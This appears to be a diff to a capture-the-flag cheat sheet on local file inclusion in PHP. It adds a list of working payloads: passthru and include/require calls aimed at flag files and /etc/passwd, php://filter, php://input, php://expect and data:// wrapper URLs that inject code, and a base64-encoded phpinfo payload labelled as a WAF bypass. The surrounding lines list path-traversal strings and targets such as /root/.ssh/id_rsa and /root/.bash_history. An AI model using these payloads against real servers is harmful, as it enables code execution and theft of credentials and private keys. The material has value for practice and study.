@@ -161,7 +161,6 @@ $ <?php passthru(['w']); ?>
 
 Other things to try:
 ```
-php://filter | php://input | php://expect
 ./index.php | ././index.php | .//index.php
 ../../../../../../etc/passwd | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 /etc/nginx/conf.d/default.conf
@@ -171,6 +170,30 @@ php://filter | php://input | php://expect
 /root/.bash_history
 /root/.ssh/id_rsa
 /root/.ssh/authorized_keys
+```
+
+PHP things:
+```php
+/* Vulnerable php code to LFI 
+ * i.e. if source code uses these functions, most likely exploitable.
+ *      or if not, try to inject this code somewhere i.e. in HTTP headers or forms.
+ */
+<?php passthru('cat /flag*');?>              // <- successful payload in one of the challenges
+<?php require('../../etc/passwd'); ?> 
+<?php require_once('../../etc/passwd'); ?> 
+<?php include('../../etc/passwd'); ?>
+<?php include_once('../../etc/passwd'); ?> 
+
+/* Try these PHP protocol extensions */
+php://filter/resource=/etc/passwd    // 'resource' arg is required
+php://input
+php://expect
+php://data => exploit: http://localhost/include.php?page=data:text/plaintext,<?php phpinfo();?>
+data://text/plain;base64,
+^DIRECTLY ADD PHP CODE INTO THE GET PARAM
+
+/* Bypass WAFs by base64 encoding your phpinfo() payload */
+http://localhost/include.php?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOyA/Pg==
 ```
 
 Windows LFI:
